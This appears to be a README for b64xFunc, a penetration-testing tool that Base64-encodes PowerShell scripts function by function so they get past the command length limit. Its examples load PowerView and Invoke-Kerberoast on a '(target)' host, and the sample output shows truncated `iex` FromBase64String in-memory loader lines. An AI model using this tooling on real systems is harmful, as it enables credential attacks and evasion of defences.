# b64xFunc - Base64 Encode PS1 Scripts by Function

b64xFunc encodes a ps1 script function by function and generates a series of powershell commands to rebuild the original ps1 functionality in memory. 

Powershell has a command length limit of 8,191 characters. This limits the size of ps1 scripts that can be executed using the `powershell -enc` parameter. By encoding large ps1 files function by function, b64xFunc can bypass this command length restriction.

```
Usage:
   b64xFunc.py -file FILE	  Load ps1 from file
   b64xFunc.py -url URL           Load ps1 from url
   b64xFunc.py -cmd "CMD"	  Encode a single command

Full Example:
   (kali)   b64xFunc.py -file powerview.ps1 > test.ps1
   (kali)   b64xFunc.py -file Invoke-Kerberoast.ps1 >> test.ps1
   (target) Import-Module ./test.ps1
   (target) Invoke-Kerberoast | fl
```

OR

```
   (windows) python .\b64xFunc.py -file .\PowerView.ps1 | clip
   (target)  [Ctrl-V] [Enter]
```

## Sample Output
```
python b64xFunc.py -url https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV...pbGRlcgp9Cg==")))
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gZnV...ydGllcwp9Cg==")))
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWR...zCiAgICB9Cn0K")))
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gcHN...lVHlwZSgpCn0K")))
[... output truncated ...]
```
